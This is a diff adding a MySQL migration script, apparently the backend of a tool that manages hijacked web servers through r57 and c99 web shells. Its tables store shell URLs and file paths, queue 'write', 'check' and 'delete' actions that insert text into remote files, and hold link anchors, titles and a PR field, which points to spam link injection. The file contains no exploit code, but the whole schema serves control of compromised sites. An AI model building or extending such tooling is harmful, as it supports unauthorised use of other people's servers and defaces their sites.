@@ -1,0 +1,279 @@
+
+/** Transmit storage table */
+create table `l_transmit` (
+	`id` int(11) unsigned not null primary key auto_increment,
+	`text` text not null,
+	`dirty` tinyint(4) unsigned not null default 0,
+	index `l_transmit_dirty` (`dirty`)
+) engine=InnoDB default character set = utf8;
+
+
+/** URL storage table */
+create table `l_url` (
+	`id` int(11) unsigned not null primary key auto_increment,
+	`url` varchar(255) not null,
+	`status` tinyint(4) unsigned not null default 0,
+	`transmit` int(11) unsigned not null,
+	index `l_url_status` (`status`),
+	constraint `l_url_transmit` foreign key (`transmit`) references `l_transmit` (`id`)
+) engine=InnoDB default character set = utf8;
+
+/** Action table, ex: delete, check, write etc */
+create table `action` (
+	`id` int(11) unsigned not null primary key auto_increment,
+	`key` varchar(16) not null unique key,
+	`name` varchar(255) null
+) engine=InnoDB default character set = utf8;
+
+/** Tasks table, for next process */
+create table `task` (
+	`id` int(11) unsigned not null primary key auto_increment,
+	`url_id` int(11) unsigned not null,
+	`action_id` int(11) unsigned not null,
+	`status` tinyint(4) unsigned not null default 0,
+	`in_process` tinyint(4) unsigned not null default 0,
+	index `task_in_process` (`status`),
+	index `task_status` (`in_process`),
+	constraint `task_url_id` foreign key (`url_id`) references `l_url` (`id`),
+	constraint `task_action_id` foreign key (`action_id`) references `action` (`id`)
+) engine=InnoDB default character set = utf8;
+
+
+alter table `task` modify column `status` tinyint(4) unsigned null;
+
+alter table `l_url` modify column `status` tinyint(4) unsigned null;
+
+alter table `l_url` modify column `transmit` int(11) unsigned null;
+
+
+/** insert default actions */
+insert into `action` set `key` = 'write', `name` = 'Write transmit to end of file';
+insert into `action` set `key` = 'check', `name` = 'Check is transmit already into file or not';
+insert into `action` set `key` = 'delete', `name` = 'Delete file without transmit use';
+
+
+create table `response_code` (
+	`id` int(11) unsigned not null primary key auto_increment,
+	`key` varchar(16) not null unique key,
+	`name` varchar(255) null
+) engine=InnoDB default character set = utf8;
+
+
+/** Drop status from task and add response code */
+alter table `task` drop index `task_status`;
+alter table `task` drop column `status`;
+
+alter table `task` add column `response_code_id` int(11) unsigned not null;
+
+alter table `task` add 
+	constraint `task_response_code_id` 
+	foreign key (`response_code_id`) 
+	references `response_code` (`id`);
+
+alter table `task` modify column `response_code_id` int(11) unsigned null;
+
+
+/** 31.10.08 */
+
+/** Global rename l_url to l_shell */
+rename table `l_url` to `l_shell`;
+
+truncate table `task`;
+alter table `task` drop foreign key `task_url_id`;
+alter table `task` change `url_id` `shell_id` int(11) unsigned not null;
+alter table `task` add constraint `task_shell_id` foreign key (`shell_id`) references `l_shell` (`id`);
+
+/** rename transmit to transmit_id */
+truncate table `l_shell`;
+alter table `l_shell` drop foreign key `l_url_transmit`;
+alter table `l_shell` change `transmit` `transmit_id` int(11) unsigned null;
+alter table `l_shell` add constraint `l_shell_transmit_id` foreign key (`transmit_id`) references `l_transmit` (`id`);
+
+
+insert into `response_code` set `key` = '000', `name` = 'Файла не существует';
+insert into `response_code` set `key` = '001', `name` = 'Нет доступа для чтения\записи';
+insert into `response_code` set `key` = '010', `name` = 'В запросе не найден путь';
+insert into `response_code` set `key` = '011', `name` = 'В запросе не найден тип действия';
+insert into `response_code` set `key` = '100', `name` = 'В запросе не найден входной текст';
+insert into `response_code` set `key` = '101', `name` = 'Неверно указан тип действия';
+insert into `response_code` set `key` = '110', `name` = 'Текст не найден в файле';
+insert into `response_code` set `key` = '111', `name` = 'Текст найден в файле';
+
+
+/** 01.11.08 */
+
+alter table `l_shell` add column `path` varchar(255) null after `url`;
+
+
+truncate table `response_code`;
+
+insert into `response_code` set `key` = '000', `name` = 'File is not exists';
+insert into `response_code` set `key` = '001', `name` = 'Persmission denied';
+insert into `response_code` set `key` = '010', `name` = 'Request path is not specified';
+insert into `response_code` set `key` = '011', `name` = 'Request action is not specified';
+insert into `response_code` set `key` = '100', `name` = 'Request transmit is not specified';
+insert into `response_code` set `key` = '101', `name` = 'Request action is not defined';
+insert into `response_code` set `key` = '110', `name` = 'Checking failure';
+insert into `response_code` set `key` = '111', `name` = 'Checking success';
+insert into `response_code` set `key` = '200', `name` = 'Success';
+
+
+insert into `action` set `key` = 'rewrite', `name` = 'Full rewrite remote shell file with local for update';
+
+
+/** release */
+
+
+/** 02.11.08 */
+
+/** truncate transmit and adding key to him */
+truncate table `l_transmit`;
+alter table `l_transmit` add column `key` varchar(64) null after `id`;
+
+
+/** release **/
+
+/** 02.11.08 */
+
+alter table `l_transmit` modify column `key` varchar(64) not null;
+
+alter table `task` add constraint `task_unique_shell_id_action_id` unique (`shell_id`, `action_id`);
+
+alter table `l_transmit` drop index `l_transmit_dirty`;
+alter table `l_transmit` drop column `dirty`;
+
+
+/** release **/
+
+/** 09.11.08 */
+
+alter table `task` drop column `in_process`;
+
+alter table `task` add column `modified` timestamp not null default CURRENT_TIMESTAMP on update CURRENT_TIMESTAMP;
+
+/** release **/
+
+
+/** 10.11.08 */ 
+
+insert into `response_code` set `key` = '301', `name` = 'Path is not exists';
+insert into `response_code` set `key` = '302', `name` = 'Path is not a file';
+insert into `response_code` set `key` = '303', `name` = 'Path is not readable';
+insert into `response_code` set `key` = '304', `name` = 'Path is not writable';
+
+alter table `l_shell` add column `version` varchar(32) null after `status`;
+alter table `l_shell` modify column `status` varchar(255) null;
+
+update `l_shell` set `status` = null;
+
+
+alter table `l_shell` add constraint `l_shell_url_path` unique (`url`, `path`);
+
+
+/** release */
+
+alter table `task` add column `response_body` text null after `response_code_id`;
+
+
+insert into `response_code` set `key` = '305', `name` = 'Cant open self';
+insert into `response_code` set `key` = '306', `name` = 'Cant write to self';
+
+/** release */
+
+/** 20.01.09 */
+
+create table `tag` (
+	`id` int(11) unsigned not null primary key auto_increment,
+	`key` varchar(16) not null,
+	`open` varchar(255) not null,
+	`close` varchar(255) not null
+) default character set = utf8 Engine=InnoDB;
+
+/* release */
+
+
+
+create table `shell_type` (
+	`id` int(11) unsigned not null primary key auto_increment,
+	`key` varchar(16) not null,
+	`name` varchar(255) null
+) default character set = utf8 Engine=InnoDB;
+
+insert into `shell_type` set `key` = 'r57';
+insert into `shell_type` set `key` = 'c99';
+
+alter table `l_shell` add column `shell_type_id` int(11) unsigned not null;
+alter table `l_shell` add constraint `shell_shell_type_id` 
+	foreign key (`shell_type_id`) references `shell_type` (`id`);
+
+
+alter table `l_shell` drop column `version`;
+
+
+create table `shell_status` (
+	`id` int(11) unsigned not null primary key auto_increment,
+	`key` varchar(16) not null,
+	`name` varchar(255) null
+) default character set = utf8 Engine=InnoDB;
+
+insert into `shell_status` set `key` = 'url', `name` = 'Url looks like not valid';
+insert into `shell_status` set `key` = 'response', `name` = 'Invalid response from host';
+insert into `shell_status` set `key` = 'type_not_support', `name` = 'Shell type not supported';
+update `shell_status` set `key` = 'remote_shell', `name` = 'Remote shell internal error' where `key` = 'type_not_support';
+insert into `shell_status` set `key` = 'undefined', `name` = 'Undefined error';
+insert into `shell_status` set `key` = 'ok', `name` = 'Shell validation success';
+insert into `shell_status` set `key` = 'path', `name` = 'Wrong path to index';
+
+update `shell_status` set `name` = 'ok' where `key` = 'ok';
+
+truncate table `l_shell`;
+alter table `l_shell` change column `status` `status_id` int(11) not null;
+
+alter table `l_shell` modify column `status_id` int(11) unsigned not null;
+alter table `l_shell` add constraint `shell_status_id` 
+    foreign key (`status_id`)  references `shell_status` (`id`);
+
+alter table `l_shell` add `debug` text null;
+
+alter table `l_shell` modify column `shell_type_id` int(11) unsigned null;
+
+
+
+alter table `task` drop foreign key `task_response_code_id`;
+drop table `response_code`;
+alter table `task` drop column `response_code_id`;
+alter table `task` drop column `response_body`;
+
+
+alter table `task` add column `status` int(1) unsigned null;
+
+delete from `action` where `key` = 'rewrite';
+
+
+
+/** 18.03.09 */
+
+alter table `l_shell` add column `comment` varchar(255) null;
+
+
+/** 25.03.09 */
+alter table `l_shell` add column `pr` int(3) unsigned null after `shell_type_id`;
+
+
+/** 14.04.09 */
+/** Just randomization table */
+create table `link_part` (
+	`id` int(11) unsigned not null primary key auto_increment,
+	`key` varchar(16) not null,
+	`title` varchar(255) not null,
+	`anchor` varchar(255) not null
+) default character set = utf8 Engine=InnoDB;
+
+
+alter table `l_transmit` add column `randomize_type` varchar(11) null;
+
+/** Table of transmit randomize exceptions   O_o*/
+create table `keyword` (
+	`id` int(11) unsigned not null primary key auto_increment,
+	`key` varchar(32) not null
+) default character set = utf8 Engine=InnoDB;
